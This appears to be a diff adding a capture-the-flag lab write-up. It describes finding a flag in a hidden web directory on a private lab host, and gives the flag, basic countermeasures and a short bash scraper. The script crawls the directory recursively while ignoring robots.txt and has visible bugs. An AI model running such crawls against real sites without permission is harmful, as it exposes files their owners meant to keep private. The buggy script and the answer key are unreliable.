@@ -1,0 +1,39 @@
+http://192.168.57.3/.hidden
+
+You have a url that point to /.hidden 
+In this directory a lots of folder and file are listed 
+
+When we go over all the file we can see that lots of files have the same content.
+Remove the file with content that give nothing as information.
+You will find a file with a number 
+
+flag = 99dde1d35d1fdd283924d84e6d9f1d820
+
+-------------------------- Countermeasure ----------------------------------------
+    - Don't give access to file with important information.
+    - Limit the access of the serveur to where it should work.
+    - Don't give the server root lvl and change the access to important file
+    - Move the file somewhere people can't find it 
+    - Configure your htaccess
+
+-------------------------- script ----------------------------------------
+
+#!/bin/bash
+mkdir ./scrap ; cd ./scrap
+wget -np -nd -r -A "README*" -e robots=off http://192.168.1.32/.hidden/
+i=`ls | grep README | wc -l`
+i=$(($i-1))
+readme="README."
+while [ $i != 0 ]
+do
+	file=$readme$i
+	str=`cat $file | grep 2`
+    if test str != ""
+    then
+        print str
+    fi
+	printf "%s" $str
+	i=$(($i-1))
+done
+str=`cat "README" | grep -E [0-9a-f]{64}`
+printf "%s" $str
